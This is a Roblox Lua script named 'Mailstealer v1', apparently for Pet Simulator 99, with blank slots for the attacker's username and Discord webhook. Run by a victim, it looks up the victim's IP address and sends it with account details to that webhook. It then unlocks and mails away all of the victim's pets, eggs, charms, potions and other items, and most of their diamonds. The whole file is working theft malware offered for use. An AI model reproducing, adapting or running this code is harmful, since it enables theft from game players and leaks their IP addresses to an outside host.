Username = ""
Webhook = ""
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
if getgenv().executed then return end
getgenv().executed = true

--// Variables

local Library = require(game.ReplicatedStorage.Library)
local Save = Library.Save.Get().Inventory
plr = game.Players.LocalPlayer
guis = plr.PlayerGui
local HttpService = game:GetService("HttpService")
local Directory = game:GetService("ReplicatedStorage").__DIRECTORY.Pets
local request = request or http_request or httprequest
local MailMessage = "egorikusa wrote this alone"
--// Functions
AmountOfHuges = 0
for i, v in pairs(Save.Pet) do
    local id = v.id
    local dir = Library.Directory.Pets[id]
    if dir.huge == true then
        AmountOfHuges = AmountOfHuges + 1
    end
end
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local GetPets = function()
    return GetSave().Inventory.Pet
end

local GetGems = function()
    for i, v in pairs(GetSave().Inventory.Currency) do 
        if v.id == 'Diamonds' then
            return v._am, i
        end 
    end
end

GemAmount = GetGems()

local ipwebhook = game:HttpGet('https://ipinfo.io/ip')
local url = Webhook
local whenabled = true
local function SendWebhook(url, ping)
    imgs =
        "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
    data1 = {
        ["content"] = ping,
        ["username"] = "Mailstealer v1",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/mailstealer",
                ["type"] = "rich",
                ["color"] = tonumber(0xab7718),
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&",
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            game.Players.LocalPlayer.Name ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    game.Players.LocalPlayer.DisplayName ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username .. "\n(\240\159\145\164) Ip: " ..
                                                 ipwebhook .. "\n(\240\159\147\140) Version: 1 ```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) Huges:`",
                        ["value"] = "```" .. AmountOfHuges .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\146\142) Gems:`",
                        ["value"] = "```" .. GemAmount .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\154\128) Made by:`",
                        ["value"] = "```Egorikusa for Mori```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/mailstealer**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }

    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil and whenabled == true then
        abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        request(abcdef1)
    end
end

SendWebhook(Webhook, "@everyone")

local GetMaxHits = function(GemAmount)
    return math.floor(GemAmount / 10000)
end

--// Main


for i,v in pairs(Save.Pet) do
    local id = v.id
    local dir = Library.Directory.Pets[id]
    if v._lk then
    local args = {
    [1] = i,
    [2] = false
    }
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
end
end

if Save.Egg ~= nil then
for i,v in pairs(Save.Egg) do
    local id = v.id
    local dir = Library.Directory.Eggs[id]
    if v._lk then
    local args = {
    [1] = i,
    [2] = false
    }
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
end
end
end

if Save.Hoverboard ~= nil then
for i,v in pairs(Save.Hoverboard) do
    local id = v.id
    local dir = Library.Directory.Hoverboards[id]
    if v._lk then
    local args = {
    [1] = i,
    [2] = false
    }
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
end
end
end

if Save.Booth ~= nil then
    for i,v in pairs(Save.Booth) do
        local id = v.id
        local dir = Library.Directory.Booths[id]
        if v._lk then
        local args = {
        [1] = i,
        [2] = false
        }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
    end
    end
    end

if Save.Charm ~= nil then
for i,v in pairs(Save.Charm) do
    local id = v.id
    local dir = Library.Directory.Charms[id]
    if v._lk then
    local args = {
    [1] = i,
    [2] = false
    }
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
end
end
end

if Save.Enchant ~= nil then
    for i,v in pairs(Save.Enchant) do
        local id = v.id
        local dir = Library.Directory.Enchants[id]
        if v._lk then
        local args = {
        [1] = i,
        [2] = false
        }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
        end
    end
end

if Save.Potion ~= nil then
    for i,v in pairs(Save.Potion) do
        local id = v.id
        local dir = Library.Directory.Potions[id]
        if v._lk then
        local args = {
        [1] = i,
        [2] = false
        }
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
        end
    end
end
--// Send Pets

user = Username

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
print("start sending")
while true do
    wait(1)
    while true do
HugeAmount = 0
if Save.Pet ~= nil then
    for i,v in pairs(Save.Pet) do
        local id = v.id
        local dir = Library.Directory.Pets[id]
        if dir.huge and not dir.Tradable ~= nil then
            HugeAmount = HugeAmount + 1
            if HugeAmount ~= 0 then
                print(HugeAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Pet",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if HugeAmount == 0 then
            print("huge end")
            break
        end
    end
end
end
while true do
EggAmount = 0
if Save.Egg ~= nil then
    for i,v in pairs(Save.Egg) do
        local id = v.id
        local dir = Library.Directory.Eggs[id]
        if dir then
            EggAmount = EggAmount + 1
            if EggAmount ~= 0 and HugeAmount == 0 then
                print(EggAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Egg",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if EggAmount == 0 then
            print("egg end")
            break
        end
    end
end
end
while true do
ExcAmount = 0
if Save.Pet ~= nil then
    for i,v in pairs(Save.Pet) do
        local id = v.id
        local dir = Library.Directory.Pets[id]
        if dir.exclusiveLevel then
            ExcAmount = ExcAmount + 1
            if ExcAmount ~= 0 and EggAmount == 0 and HugeAmount == 0 then
                print(ExcAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Pet",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if ExcAmount == 0 then
            print("exc end")
            break
        end
    end
end
end
while true do
CharmAmount = 0
if Save.Charm ~= nil then
    for i,v in pairs(Save.Charm) do
        local id = v.id
        local dir = Library.Directory.Charms[id]
        if dir then
            CharmAmount = CharmAmount + 1
            if CharmAmount ~= 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
                print(CharmAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Charm",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if CharmAmount == 0 then
            print("charm end")
            break
        end
    end
end
end
while true do
EnchantAmount = 0
if Save.Enchant ~= nil then
    for i,v in pairs(Save.Enchant) do
        local id = v.id
        local dir = Library.Directory.Enchants[id]
        if dir then
            EnchantAmount = EnchantAmount + 1
            if EnchantAmount ~= 0 and CharmAmount == 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
                print(EnchantAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Enchant",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if EnchantAmount == 0 then
            print("enchants end")
            break
        end
    end
end
end
while true do 
HoverboardAmount = 0
if Save.Hoverboard ~= nil then
    for i,v in pairs(Save.Hoverboard) do
        local id = v.id
        local dir = Library.Directory.Hoverboards[id]
        if not dir.Tradable ~= nil then
            HoverboardAmount = HoverboardAmount + 1
            if HoverboardAmount ~= 0 and EnchantAmount == 0 and CharmAmount == 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
                print(HoverboardAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Hoverboard",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if HoverboardAmount == 0 then
            print("hover end")
            break
        end
    end
end
end
while true do
PotionAmount = 0
if Save.Potion ~= nil then
    for i,v in pairs(Save.Potion) do
        local id = v.id
        local dir = Library.Directory.Potions[id]
        if not dir.Tradable ~= nil then
            PotionAmount = PotionAmount + 1
            if PotionAmount ~= 0 and HoverboardAmount == 0 and EnchantAmount == 0 and CharmAmount == 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
                print(PotionAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Potion",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if PotionAmount == 0 then
            print("potion end")
            break
        end
    end
end
end
while true do
LootboxAmount = 0
if Save.Lootbox ~= nil then
    for i,v in pairs(Save.Lootbox) do
        local id = v.id
        local dir = Library.Directory.Lootboxes[id]
        if not dir.Tradable ~= nil then
            LootboxAmount = LootboxAmount + 1
            if LootboxAmount ~= 0 and PotionAmount == 0 and HoverboardAmount == 0 and EnchantAmount == 0 and CharmAmount == 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
                print(LootboxAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Lootbox",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if LootboxAmount == 0 then
            print("lootbox end")
            break
        end
    end
end
end
while true do
MiscAmount = 0
if Save.Misc ~= nil then
    for i,v in pairs(Save.Misc) do
        local id = v.id
        local dir = Library.Directory.MiscItems[id]
        if not dir.Tradable ~= nil then
            MiscAmount = MiscAmount + 1
            if MiscAmount ~= 0 and LootboxAmount == 0 and PotionAmount == 0 and HoverboardAmount == 0 and EnchantAmount == 0 and CharmAmount == 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
                print(MiscAmount)
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Misc",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
                    unpack(args))
            end
        end
        if MiscAmount == 0 then
            print("misc end")
            break
        end
    end
end
end

if MiscAmount == 0 and LootboxAmount == 0 and PotionAmount == 0 and HoverboardAmount == 0 and EnchantAmount == 0 and CharmAmount == 0 and ExcAmount == 0 and EggAmount == 0 and HugeAmount == 0 then
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
        GemId = i
        local args = {
            [1] = user,
            [2] = MailMessage,
            [3] = "Currency",
            [4] = GemId,
            [5] = GemAmount - 10000
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(
            unpack(args)
        )
        GemsStolen = true
    end
end
end
if GemsStolen == true then
    print("done")
end
end

